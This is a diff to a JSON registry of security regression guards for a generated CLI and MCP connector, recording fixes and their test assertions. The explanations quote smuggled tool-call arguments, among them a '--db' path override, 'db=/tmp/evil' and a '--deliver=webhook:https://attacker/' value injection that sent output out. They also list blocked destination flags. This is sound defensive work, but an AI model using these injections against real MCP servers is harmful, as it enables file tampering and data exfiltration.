@@ -6,7 +6,7 @@
   {
    "id": "doctor-verdict-tracks-reality",
    "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
-   "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.",
+   "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282. REPRINT 4.32.5 (2026-09-28): the press now emits doctorInfoKeys/doctorIsInfoKey and the key-aware --fail-on scan natively in doctor.go (so doctor_verdict.go no longer defines them) and has dropped the 'but auth was accepted' line for a WARN. Still connector-only: refusing to dial the shipped placeholder base_url, the explicit ERROR row when no credential is configured, and doctorUnexpectedStatus (404 = wrong base_url, api row goes red). Also re-applied at the 4.32.5 review: the generated credential probe used the cache-enabled GetWithHeaders, so a credential revoked server-side could read 'valid' from a cached 200 for the cache TTL; doctor.go now calls GetWithHeadersNoCache. And doctorShippedBaseURL is EMPTY for huntress: https://api.huntress.io is the real, only API host, so an operator who never set HUNTRESS_BASE_URL is correctly configured - filling the literal in (v0.1.5 and earlier) made doctor refuse to probe every default install.",
    "status": "active",
    "asserts": [
     {
@@ -36,6 +36,18 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "c.GetWithHeadersNoCache(cmd.Context(), verifyPath, authParams, authHeaders)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -96,7 +108,7 @@
   {
    "id": "mcp-filesystem-destination-gate",
    "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
+   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect. REPRINT 4.32.5 (2026-09-28): cli-printing-press now emits blockedDestinationFlags natively (audit-dir, db, o, output, receipt-file), folds it into every tool's blocked set via blockedStructuredArgsForCommand in typemap.go (so blocked flags are also dropped from the tool's input schema and unknown names are rejected by validateMCPArgumentNames - both residuals below are closed), and refuses argument names carrying '='. Still connector-only: the wider floor (from-csv, home, input, notes-file, out, playbook-file, playbook-notes-file, reconcile), the usage-text rule (isFilesystemPathFlag / filesystemPathFlagPhrases), UnblockedFilesystemPathFlags and the two hand-written test files that walk the live tree.",
    "status": "active",
    "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
    "asserts": [
@@ -106,9 +118,10 @@
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
+     "file": "cli/internal/mcp/cobratree/typemap.go",
+     "contains": "for name := range blockedDestinationFlags {",
+     "min_count": 1,
+     "code_only": true
     },
     {
      "file": "cli/internal/mcp/cobratree/shellout.go",
@@ -145,8 +158,8 @@
   {
    "id": "mcp-argv-value-joined",
    "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
+   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot. REPRINT 4.32.5 (2026-09-28): the joined --flag=value emission is native in the press's cobratree/shellout.go.tmpl (all four value branches) and its own TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag; only the one-element-per-branch table (the \"--filter=map[a:1]\" default-branch case) is still a hand addition to the generated test.",
+   "status": "upstreamed",
    "asserts": [
     {
      "file": "cli/internal/mcp/cobratree/shellout.go",
@@ -187,6 +200,44 @@
      "contains": "\"--filter=map[a:1]\"",
      "min_count": 1,
      "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-http-read-header-timeout",
+   "summary": "The MCP server's --transport http listener sets ReadHeaderTimeout so one client cannot hold it open by dribbling request headers",
+   "why": "cli-printing-press 4.32.5 gives every MCP server a --transport http mode (streamable HTTP behind bearer auth) and the generated cmd/huntress-mcp/main.go http.Server literal sets no header-read deadline, so a single client could hold the listener open indefinitely by sending request headers one byte at a time (Slowloris). gosec G112 flags exactly this shape and the security gate raised it as P1 on the 4.32.5 reprint (same finding datagate carried since PR #317). The fix adds ReadHeaderTimeout: 10 * time.Second to the http.Server literal. A reprint regenerates main.go without the field and go build stays green, so this marker is the only thing that notices. code_only because the explanatory comment above the field also names G112 - the assert must be satisfied by the field itself. DURABLE FIX belongs in the press's mcp main.go template; file via printing-press-retro.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/cmd/huntress-mcp/main.go",
+     "contains": "ReadHeaderTimeout: 10 * time.Second,",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-store-path-matches-cli",
+   "summary": "The MCP search/sql tools resolve the local store through the CLI's own resolver, so they read the credential-scoped data-<hash>.db that `sync` writes on a fresh install",
+   "why": "cli-printing-press 4.32 scopes a FRESH local store by a hash of the configured credential (helpers.go defaultDBPathInDir: data-<hash>.db unless a legacy data.db already exists), but the generated internal/mcp/tools.go mcpDBPath still hard-codes data.db. On a new install every sync - including one the MCP server itself shells out to - lands in the scoped file and the MCP search and sql tools then report that no store exists. Found by the 4.32.5 reprint review (Codex P1). The fix adds hand-authored internal/cli/mcp_store_path.go (MCPStorePath, which calls the same defaultDBPathInDir) and makes mcpDBPath return cli.MCPStorePath(); internal/mcp/store_path_test.go fails against the pristine resolver (proven both directions). A reprint regenerates tools.go with the hard-coded path and the build stays green. DURABLE FIX belongs in the press's mcp tools.go template; file via printing-press-retro.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "return cli.MCPStorePath()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_store_path.go",
+     "contains": "func MCPStorePath() (string, error) {",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/mcp/store_path_test.go",
+     "contains": "func TestMCPStorePathFollowsCredentialScopedCLIStore(",
+     "min_count": 1
     }
    ]
   }
